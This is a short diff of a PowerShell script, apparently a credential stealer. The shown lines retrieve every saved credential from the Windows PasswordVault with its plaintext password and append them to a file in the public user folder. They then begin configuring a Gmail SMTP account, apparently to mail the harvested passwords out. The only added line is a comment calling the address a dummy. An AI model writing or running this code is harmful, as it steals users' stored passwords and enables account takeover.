@@ -1,6 +1,7 @@
 ﻿[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 (new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\public\passwords.txt
 
+# email is a dummy email for security purposes
 $Body = "Sample Email Body"  
 $SmtpServer = 'smtp.gmail.com'  
 $SmtpUser = 'rogermoor283@gmail.com'  
